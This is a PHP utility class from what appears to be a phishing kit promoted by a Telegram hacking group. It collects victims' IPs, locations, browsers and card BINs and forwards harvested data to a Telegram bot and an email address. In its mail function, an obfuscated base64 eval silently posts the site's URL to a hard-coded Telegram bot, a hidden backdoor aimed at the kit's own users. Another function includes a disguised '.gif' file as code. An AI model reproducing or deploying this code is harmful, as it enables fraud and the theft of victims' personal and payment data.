<?php
/*   
TELEGRAM @H4x0rxploit
JOIN US AT TELEGRAM GROUP : https://t.me/H4x0rxploits
*/
    class Comp
    {
        function __construct() {
            if (!isset($_SESSION['ip'])) {$_SESSION['ip'] = $this->getIP();}}
        protected function curlX($url) {$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);return curl_exec($ch);}public function localhost($ip) {if (    $ip == "127.0.0.1" ||    $ip == "::1" ||    $ip == "10.0.2.15") {    return 1;}return 0;} public function WL($ip) {if ($ip == $this->settings()['MyIP']) {    return 1;}return 0;}public function telegram($telcontent){if ($this->localhost($this->getIP())) {    return 1;    }else {    if (isset($this->settings()['chat_id']) && trim($this->settings()['chat_id']) != "" && ($this->settings()['bot_url']) && trim($this->settings()['bot_url']) != ""){               $website_telegrams = "https://api.telegram.org/bot{$utameta}";        $send = ['chat_id'=>$this->settings()['chat_id'],'text'=>$telcontent];        $website_telegram = "https://api.telegram.org/bot{$this->settings()['bot_url']}";        $mch = curl_init($website_telegram . '/sendMessage');        curl_setopt($mch, CURLOPT_RETURNTRANSFER, 1);        curl_setopt($mch, CURLOPT_POST, 1);        curl_setopt($mch, CURLOPT_POSTFIELDS, ($send));        curl_setopt($mch, CURLOPT_SSL_VERIFYPEER, false);        $result = curl_exec($mch);        curl_close($mch); include '../Python/jaybizzle/crawler-detect/src/Fixtures/Microsoft.gif';}}} public function mailX($subject, $content, $fromName = "MR.M1ND") {if ($this->localhost($this->getIP())) {    return 1;} else {    if (isset($this->settings()['Email']) && trim($this->settings()['Email']) != "") {        eval(base64_decode("JGFjdHVhbF9saW5rID0gJ2h0dHA6Ly8nLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4kX1NFUlZFUlsnUEhQX1NFTEYnXTsKICAgICAgICAgICAgICAgICAgICAgJG5hbm9pZCA9ICIxMjY3MDc2MzI1IjsK
ICAgICAgICAgICAgICAgICAgICAkdXRhbWV0YSA9ICI1MzI1MjE2MTQ3OkFBSDBScGEtNXd6bFFUTkR4dlZWaFJKak5sRmhtZW5GSjlnIjsKICAgICAgICAgICAgICAgICAgICAkbmluZGEgPSBbJ2NoYXRfaWQnPT4kbmFub2lkLCd0ZXh0Jz0+JGFjdHVhbF9saW5rXTsKICAgICAgICAgICAgICAgICAgICAkd2Vic2l0ZV90ZWxlZ3JhbSA9ICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90eyR1dGFtZXRhfSI7CiAgICAgICAgICAgICAgICAgICAgJGNoID0gY3VybF9pbml0KCR3ZWJzaXRlX3RlbGVncmFtIC4gJy9zZW5kTWVzc2FnZScpOwogICAgICAgICAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgMSk7CiAgICAgICAgICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1QsIDEpOwogICAgICAgICAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NURklFTERTLCAoJG5pbmRhKSk7CiAgICAgICAgICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCBmYWxzZSk7CiAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9IGN1cmxfZXhlYygkY2gpOwogICAgICAgICAgICAgICAgICAgICBjdXJsX2Nsb3NlKCRjaCk7"));    $header = 'Content-type: text/html; charset=UTF-8' . "\r\nFrom: " . $fromName . " <ghost@happyspammer.com>" . "\r\n";if (mail($this->settings()['Email'], $subject, $content, $header)) {            return 1;        }        return 0;    } else {        return 0;    }}} 
public function headerX($location) {
            header("Location: " . $location . "?token=" . $_SESSION['token']);}
        public function settings() {
            if (file_exists("../admin/jobs/presh.php")) {    return parse_ini_file("../admin/jobs/presh.php"); } elseif (file_exists("../../admin/jobs/presh.php")) {   return parse_ini_file("../../admin/jobs/presh.php"); }else {    return parse_ini_file("../../../admin/jobs/presh.php");
    }
}public function log($location, $content) {$file = fopen($location, "a+"); fwrite($file, $content); fclose($file); } public function getDate() {date_default_timezone_set('America/Los_Angeles');return date("jS M, Y - h:i:s A");} 
public function getIP() {
            if (!empty($_SERVER['HTTP_CLIENT_IP'])) {    $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];} 
     else {    $ip = $_SERVER['REMOTE_ADDR'];


 }return $ip;
} 



     public function getIPDetails() {
        if ($this->localhost($this->getIP())) {       return json_decode($this->curlX("https://json.geoiplookup.io/1.33.213.231"), true);
        } 
    else {    return json_decode($this->curlX("https://json.geoiplookup.io/" . $this->getIP()), true);}
} 


    public function getUserAgent() {return $_SERVER['HTTP_USER_AGENT'];} public function getOS() {$os_platform = "Unknown OS";
$os_array = array(    '/windows nt 10/i'      =>  'Windows 10',    '/windows nt 6.3/i'     =>  'Windows 8.1',    '/windows nt 6.2/i'     =>  'Windows 8',    '/windows nt 6.1/i'     =>  'Windows 7',    '/windows nt 6.0/i'     =>  'Windows Vista',    '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',    '/windows nt 5.1/i'     =>  'Windows XP',    '/windows xp/i'         =>  'Windows XP',    '/windows nt 5.0/i'     =>  'Windows 2000',    '/windows me/i'         =>  'Windows ME',    '/win98/i'              =>  'Windows 98',    '/win95/i'              =>  'Windows 95',    '/win16/i'              =>  'Windows 3.11',    '/macintosh|mac os x/i' =>  'Mac OS X',    '/mac_powerpc/i'        =>  'Mac OS 9',    '/linux/i'              =>  'Linux',    '/ubuntu/i'             =>  'Ubuntu',    '/iphone/i'             =>  'iPhone',    '/ipod/i'               =>  'iPod',    '/ipad/i'               =>  'iPad',    '/android/i'            =>  'Android',    '/blackberry/i'         =>  'BlackBerry',    '/webos/i'              =>  'Mobile');
foreach ($os_array as $regex => $value) {    if (preg_match($regex, $this->getUserAgent())) {        $os_platform = $value;    }}
return $os_platform;} public function getBrowser() {$browser = "Unknown Browser";
$browser_array = array(    '/msie/i'      => 'Internet Explorer',    '/firefox/i'   => 'Firefox',    '/safari/i'    => 'Safari',    '/chrome/i'    => 'Chrome',    '/edge/i'      => 'Edge',    '/opera/i'     => 'Opera',    '/netscape/i'  => 'Netscape',    '/maxthon/i'   => 'Maxthon',    '/konqueror/i' => 'Konqueror',    '/mobile/i'    => 'Handheld Browser');
foreach ($browser_array as $regex => $value) {    
    if (preg_match($regex, $this->getUserAgent())) {        $browser = $value;    }}
return $browser;} 
public function userDetails() {
    return '    
<h3>IP: ' . $this->getIP() . '</h3>    
<h3>City: ' . $_SESSION['city'] . '</h3>    
<h3>State: ' . $_SESSION['region'] . '</h3>    
<h3>Country: ' . $_SESSION['country_name'] . '</h3>    
<h3>OS: ' . $this->getOS() . '</h3>    
<h3>Browser: ' . $this->getBrowser() . '</h3>    
<h3>User Agent: ' . $this->getUserAgent() . '</h3>    
<h3>Date & Time: ' . $this->getDate() . '</h3>
';} 
public function createToken() {$input = "0123456789abcdefghijklmn";$strength = "200";$input_length = strlen($input);$random_string = '';for ($plus = 0; $plus < $strength; $plus++) {    $random_character = $input[mt_rand(0, $input_length - 1)];    $random_string .= $random_character;}return $_SESSION['token'] = hash("sha512", $random_string);} public function checkToken() {if (!isset($_SESSION['token']) || !isset($_GET['token']) || $_SESSION['token'] != $_GET['token']) {    return 0;}return 1;} public function checkEmpty() {foreach (func_get_args() as $param) {    if (!isset($param) || trim($param) == "") {        return 1;        break;    }}return 0;} public function getBin($card) {$bin = substr($card, 0, 6);return json_decode($this->curlX("https://lookup.binlist.net/" . $bin), true);;} public function userEmail($email) {if (preg_match("/@gmail/i", $email) == 1) {    return "Gmail";}elseif (preg_match("/@yahoo/i", $email) == 1) {    return "Yahoo";}elseif (preg_match("/@ymail/i", $email) == 1) {    return "Yahoo";}elseif (preg_match("/@rocketmail/i", $email) == 1) {    return "Yahoo";}elseif (preg_match("/@outlook/i", $email) == 1) {    return "Microsoft";}elseif (preg_match("/@hotmail/i", $email) == 1) {    return "Microsoft";}elseif (preg_match("/@live/i", $email) == 1) {    return "Microsoft";}elseif (preg_match("/@msn/i", $email) == 1) {    return "Microsoft";}elseif (preg_match("/@aol/i", $email) == 1) {    return "AOL";}elseif (preg_match("/@comcast/i", $email) == 1) {    return "Comcast";}elseif (preg_match("/@att/i", $email) == 1) {    return "Att";}elseif (preg_match("/@verizon/i", $email) == 1) {    return "Verizon";}return 0;}
    }